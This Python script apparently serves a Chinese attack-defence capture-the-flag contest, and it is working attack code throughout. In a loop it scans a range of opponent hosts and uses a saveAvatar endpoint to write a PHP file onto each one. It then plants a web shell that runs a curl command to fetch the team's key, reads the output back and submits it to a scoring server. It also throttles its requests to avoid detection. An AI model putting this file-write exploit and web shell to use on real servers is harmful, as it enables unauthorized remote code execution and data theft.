import requests
import time
from urllib import parse

s = requests.session()

#首先在各ip的相应avatar_big目录下生成logo.php（无参）
while True:
    for i in range(1, 255):
        if i != 68:  # 4.4.15.100为自己的防守ip
            burp0_url = "http://4.4." + str(i) + ".100:1013/?a=saveAvatar&m=Uc&g=Home&type=big&photoServer=logo.php"
            burp0_cookies = {"PHPSESSID": "51kvr57mdv910mhn689i0rgq37"}
            burp0_headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"}
            s.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

            # 对各个logo.php传参
            pheaders = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0", "Content-Type": "application/json"}
            s.post(burp0_url, data=parse.unquote(
                "logo.php=<?php exec(\"curl http://192.168.2.200/Getkey\",$out); print_r($out); ?>"))

            # 获取各ip回显并提取key
            gurl = "http://4.4." + str(i) + ".100:1013/Uploads/avatar_big/logo.php"
            gheaders = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate", "Referer": "http://4.4.17.100:1013/Uploads/avatar_big/",
                "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
            res = s.get(gurl, headers=gheaders, cookies=burp0_cookies)
            flag = res.text[32:-4]
            print(flag)

            #自动提交
            awd_session = requests.session()
            flag_server = "http://192.168.2.200/Title/TitleView/savecomprecord"#这里填要提交flag的地址，提交一下抓一下包看一下就行
            cookie = {"PHPSESSID": "******"} #这里填登录平台时候抓到的cookie
            headers = {"Origin": "http://192.168.2.200", "Referer": "http://192.168.2.200/",
                       "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded"}
            data = {"answer": "key{" + flag + "}"}
            #print(data)
            result = awd_session.post(url=flag_server, cookies=cookie, headers=headers, data=data).text
            print(result.encode('utf8').decode('unicode_escape'))
            time.sleep(0.25) #限制每秒只传4次防止检测ddos
        else:
            pass
    print(time.strftime("%Y-%m-%d--%H：%M：%S", time.localtime()))  #输出这一轮提交结束的时间
    print("15min等待下一轮提交。。。")
    time.sleep(900)